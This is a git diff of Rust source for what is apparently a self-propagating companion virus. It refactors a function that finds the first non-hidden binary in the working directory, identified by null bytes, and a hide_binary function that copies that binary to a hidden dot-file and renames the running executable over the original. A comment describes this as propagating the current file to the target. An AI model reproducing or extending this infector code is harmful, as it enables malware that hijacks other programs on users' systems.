@@ -6,40 +6,38 @@ use object::{File, Object, ObjectSection};
 use std::{env, path::Path, fs::{self, rename, set_permissions, OpenOptions}, io::{Read, Write, Seek, SeekFrom}};
 
 
-// Getting path of any binary on current running path using ReadDir
-pub fn get_path() -> String {
+// Getting binary file on current running path using ReadDir
+pub fn get_file() -> (String, String) {
     
-    let exe = env::current_exe().expect("Failed to get the path")
-                            .display().to_string()
-                            .split("/")
-                            .last().expect("Failed to slice the path")
-                            .to_string();
+    let exe = fs::canonicalize( env::current_exe().expect("Failed to get binary path"))
+                        .unwrap()
+                        .file_name().unwrap()
+                        .to_string_lossy().into_owned();
 
-    let entries = fs::read_dir(".").expect("Failed to read the current directory"); 
+       
+    let entries = fs::read_dir(env::current_dir().unwrap()).expect("Failed to read the current directory"); 
 
-    let mut binary_path = String::new();
+    let mut binary = String::new();
     for entry in entries {
+       
+        let path = entry.expect("Failed to get the path")
+                                  .file_name()
+                                  .to_string_lossy().into_owned();
         
-        let path = entry.expect("Failed to get the path").path()
-                                .display().to_string()
-                                .split("/")
-                                .last().expect("Failed to slice the path")
-                                .to_string();
-
-        let path = Path::new(&path);
-        if path.is_file() && is_binary(path) == true && path.display().to_string() != exe {    
-            binary_path.push_str(path.display().to_string().as_str());
-            break; 
-        } 
+        let bytes = path.as_bytes();
+        if bytes[0] != b'.' && !exe.eq(&path) && Path::new(&path).is_file() && is_binary(&path) == true {
+            binary.push_str(&path);
+            break;  
+        }
     }
 
-    binary_path.trim().to_string()
+    return (exe, binary);
 
  }
 
 
-// Checking the binary file using bytes, if file has null-byte (0x00) or not;
-fn is_binary(path: &Path) -> bool {
+// Checking the binary file using bytes using null-byte
+fn is_binary(path: &str) -> bool {
     
     let mut file = fs::File::open(path).expect("Failed to open the file");
     
@@ -51,11 +49,10 @@ fn is_binary(path: &Path) -> bool {
 
 
 // Propagating the current file to the target file using copy filesystem
-pub fn hide_binary(path: String, exe: String) {
+pub fn hide_binary(exe: &str, path: &str) {
 
     let hidden_path = format!(".{}", path);
-    let hidden_path = Path::new(&hidden_path);
-    fs::copy(&path, &hidden_path).expect("Failed to rename the file");
+    fs::copy(&path, &hidden_path).expect("Failed to copy");
     fs::rename(exe, path).expect("Failed to rename");
 
 }
